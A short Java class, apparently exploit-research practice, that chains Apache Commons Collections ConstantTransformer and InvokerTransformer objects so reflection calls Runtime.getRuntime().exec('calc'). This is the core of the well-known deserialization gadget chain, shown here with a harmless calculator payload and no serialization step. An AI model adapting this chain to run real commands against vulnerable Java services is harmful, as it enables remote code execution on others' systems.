package org.example;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class ConstantTransformerTrigger {
    public static void main(String[] args) {
        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.class);
        InvokerTransformer invokerTransformer1 = new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[] {"getRuntime", null});
        InvokerTransformer invokerTransformer2 = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[] {null, null});
        InvokerTransformer invokerTransformer3 = new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"calc"});
        invokerTransformer3.transform(invokerTransformer2.transform(invokerTransformer1.transform(constantTransformer.transform(new Object()))));
    }
}
